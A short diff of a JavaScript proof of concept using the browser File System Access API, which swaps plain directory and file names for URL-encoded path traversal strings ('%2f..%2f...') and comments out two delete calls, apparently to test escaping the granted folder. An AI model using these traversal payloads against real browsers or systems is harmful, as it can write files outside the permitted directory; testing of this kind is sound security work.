@@ -31,19 +31,19 @@
               // Oh yeah, creating new directories with the given handle
               // is possible - we're talking about true file system
               // access here!
-              const newDirHandle = await dirHandle.getDirectoryHandle('ZZY_POC', { create: true });
+              const newDirHandle = await dirHandle.getDirectoryHandle('%2f..%2fZZY_POC', { create: true });
 
               // Same for files in the directory. Of course.
-              const newFileHandle = await dirHandle.getFileHandle('zzy_file_travesal.txt', { create: true });
+              const newFileHandle = await dirHandle.getFileHandle('%2f..%2fzzy_file_travesal.txt', { create: true });
 
               // Deleting is done via 'removeEntry'. Here, we're deleting
               // our newly created empty txt-file.
-              await dirHandle.removeEntry('softlink.txt');
+              //await dirHandle.removeEntry('softlink.txt');
 
               // And for demo purposees, let's also delete the new
               // directory itself and any of its contents (which at
               // this point don't exist as the only file got just deleted).
-              await dirHandle.removeEntry('Folder by my PWA', { recursive: true });
+              //await dirHandle.removeEntry('Folder by my PWA', { recursive: true });
             }
 
 
